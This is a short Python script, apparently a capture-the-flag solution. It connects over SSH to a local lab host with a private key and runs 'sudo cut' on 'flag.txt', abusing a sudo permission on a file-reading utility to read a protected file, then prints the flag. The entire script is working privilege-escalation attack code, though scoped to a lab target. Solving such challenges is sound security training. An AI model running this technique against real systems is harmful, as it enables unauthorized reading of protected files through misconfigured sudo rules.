#!/usr/bin/python3
import subprocess

if __name__ == "__main__":
    # adjust this configuration
    privkey = "privatekey.pem"
    port = "4444"
    user = "test"
    ip  = "localhost"
    
    payload = "sudo cut -d \"\" -f1 \"flag.txt\""
    full_payload = f"ssh -i {privkey} {user}@{ip} -p {port} '{payload}'"
    res = subprocess.run(full_payload, shell=True, capture_output=True)

    print(f"full payload manually: {full_payload}")
    print(f"flag :", res.stdout.decode().strip())
